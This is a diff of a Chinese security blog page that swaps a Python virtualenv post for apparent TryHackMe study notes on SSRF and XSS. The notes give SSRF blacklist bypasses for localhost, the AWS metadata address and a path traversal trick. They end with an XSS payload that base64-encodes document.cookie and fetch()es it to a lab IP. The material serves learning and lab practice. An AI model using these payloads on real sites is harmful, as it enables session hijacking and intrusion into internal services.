@@ -18,21 +18,21 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="简单来说就是创造一个沙箱环境,在git clone很多个项目之后,每个项目所需要的各个服务版本可能有冲突,就在每个克隆下来的目录下创建一个虚拟环境用于下载依赖 12345678910&#x2F;&#x2F;创建虚拟环境python3 -m venv venv &#x2F;&#x2F;win系统就是python -m venv venv&#x2F;&#x2F;win启动虚拟环境venv\Scripts\activate&#x2F;&#x2F;linux启动source venv">
+    <meta name="description" content="SSRF(Server-Side Request Forgery)服务器请求伪造ssrf有两种,一种是常规ssrf,另一种是blind ssrf(盲ssrf) 常见ssrf防御黑名单云服务器可能会把127.0.0.1和localhost列进黑名单拒绝访问(看不明白),可以用其他方式绕过这个限制来访问,比如0、0.0.0.0、0000、127.1、2130706433、017700000001,12">
 <meta property="og:type" content="article">
-<meta property="og:title" content="虚拟环境">
-<meta property="og:url" content="https://blog.yblue.top/2023/08/22/%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/index.html">
+<meta property="og:title" content="SSRF+XSS">
+<meta property="og:url" content="https://blog.yblue.top/2023/08/23/SSRF/index.html">
 <meta property="og:site_name" content="Taosu&#96;Home">
-<meta property="og:description" content="简单来说就是创造一个沙箱环境,在git clone很多个项目之后,每个项目所需要的各个服务版本可能有冲突,就在每个克隆下来的目录下创建一个虚拟环境用于下载依赖 12345678910&#x2F;&#x2F;创建虚拟环境python3 -m venv venv &#x2F;&#x2F;win系统就是python -m venv venv&#x2F;&#x2F;win启动虚拟环境venv\Scripts\activate&#x2F;&#x2F;linux启动source venv">
+<meta property="og:description" content="SSRF(Server-Side Request Forgery)服务器请求伪造ssrf有两种,一种是常规ssrf,另一种是blind ssrf(盲ssrf) 常见ssrf防御黑名单云服务器可能会把127.0.0.1和localhost列进黑名单拒绝访问(看不明白),可以用其他方式绕过这个限制来访问,比如0、0.0.0.0、0000、127.1、2130706433、017700000001,12">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-08-22T15:55:48.000Z">
-<meta property="article:modified_time" content="2023-08-23T03:28:59.767Z">
+<meta property="article:published_time" content="2023-08-23T07:52:48.000Z">
+<meta property="article:modified_time" content="2023-08-23T15:34:27.088Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>虚拟环境 - Taosu`Home</title>
+  <title>SSRF+XSS - Taosu`Home</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -186,7 +186,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="虚拟环境"></span>
+            <span id="subtitle" data-typed-text="SSRF+XSS"></span>
           
         </div>
 
@@ -197,8 +197,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-08-22 23:55" pubdate>
-          August 22, 2023 pm
+        <time datetime="2023-08-23 15:52" pubdate>
+          August 23, 2023 pm
         </time>
       </span>
     
@@ -209,7 +209,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          255 words
+          1.1k words
         
       </span>
     
@@ -220,7 +220,7 @@
         
         
         
-          3 mins
+          9 mins
         
       </span>
     
@@ -257,13 +257,23 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">虚拟环境</h1>
+            <h1 id="seo-header">SSRF+XSS</h1>
             
             
               <div class="markdown-body">
                 
-                <p>简单来说就是创造一个沙箱环境,在git clone很多个项目之后,每个项目所需要的各个服务版本可能有冲突,就在每个克隆下来的目录下创建一个虚拟环境用于下载依赖</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">//创建虚拟环境<br>python3 -m venv venv //win系统就是python -m venv venv<br>//win启动虚拟环境<br>venv\Scripts\activate<br>//linux启动<br><span class="hljs-built_in">source</span> venv/bin/activate<br>//安装依赖<br>pip install -r requirements.txt<br>//退出虚拟环境<br>deactivate<br></code></pre></td></tr></table></figure>
+                <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>(Server-Side Request Forgery)<br>服务器请求伪造<br>ssrf有两种,一种是常规ssrf,另一种是blind ssrf(盲ssrf)</p>
+<h2 id="常见ssrf防御"><a href="#常见ssrf防御" class="headerlink" title="常见ssrf防御"></a>常见ssrf防御</h2><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><p>云服务器可能会把127.0.0.1和localhost列进黑名单拒绝访问(看不明白),可以用其他方式绕过这个限制来访问,比如0、0.0.0.0、0000、127.1、2130706433、017700000001,127.0.0.1.nip.io,<br>这些都是dns解析成127.0.0.1,但是没有上黑名单的<br><a target="_blank" rel="noopener" href="http://169.254.169.254/">http://169.254.169.254</a> 这个是Amazon AWS(不知道是不是特有的)的服务器存储敏感数据的地址</p>
+<h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><p><code>例如参数中使用的 URL 必须以https://website.thm开头的规则 </code><br>绕过方式是在对应域名建立子域名绕过(能给别人的域名建子域名不早打进去了吗)</p>
+<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><h2 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h2><p>这个房间真的做的乱七八糟的,感觉很拉跨<br>&#x2F;private这个目录不允许访问,在更改头像页面,发现头像来自于网站内部,所有头像更改的请求那里可以获得&#x2F;private的内容,所以图片的路径value更改成private,但是被拒绝访问,使用x&#x2F;..&#x2F;private即可绕过,这里的x填啥都可以,可以说y,可以是z,也可以是abc,不知道这里是因为thm房间特意允许的还是别的原因,正常来说应该是该目录下一个实际存在的文件+&#x2F;..&#x2F;private</p>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>Cross-site Scripting<br>按理来说应该简写成css的,但已经有了,所以叫xss<br><code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code><br>有alert则证明有xss,即POC</p>
+<h2 id="反射性xss"><a href="#反射性xss" class="headerlink" title="反射性xss"></a>反射性xss</h2><p>用户在浏览器内的输入内容会不经过滤直接回显到浏览器,这里就可以执行</p>
+<h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>保存在服务器内的数据,比如评论</p>
+<h2 id="dom型xss"><a href="#dom型xss" class="headerlink" title="dom型xss"></a>dom型xss</h2><p>利用js事件形成xss</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>很基础的六个类型,有空还得再找靶场练,总之就是凑<code>&lt;&gt; ; &quot;&quot; &#39;&#39;</code>这样的,要么就是大小写绕过,或者双写绕过之类的</p>
+<h2 id="实际操作-1"><a href="#实际操作-1" class="headerlink" title="实际操作"></a>实际操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;/textarea&gt;&lt;script&gt;fetch(<span class="hljs-string">&#x27;http://10.10.107.206:1234?cookie=&#x27;</span> + btoa(document.cookie) );&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>别的没啥值得说的,就一个类似反弹shell的东西</p>
+
                 
               </div>
             
@@ -281,7 +291,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/CS%E5%9F%BA%E7%A1%80/" class="category-chain-item">CS基础</a>
+  <a href="/categories/thm/" class="category-chain-item">thm</a>
   
   
 
@@ -301,15 +311,15 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>虚拟环境</div>
-      <div>https://blog.yblue.top/2023/08/22/虚拟环境/</div>
+      <div>SSRF+XSS</div>
+      <div>https://blog.yblue.top/2023/08/23/SSRF/</div>
     </div>
     <div class="license-meta">
       
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>August 22, 2023</div>
+          <div>August 23, 2023</div>
         </div>
       
       
@@ -341,18 +351,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/08/23/SSRF/" title="SSRF+XSS">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">SSRF+XSS</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/08/22/Kioptrix-level-1/" title="Kioptrix_level_1">
-                        <span class="hidden-mobile">Kioptrix_level_1</span>
+                      <a href="/2023/08/22/%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/" title="虚拟环境">
+                        <span class="hidden-mobile">虚拟环境</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
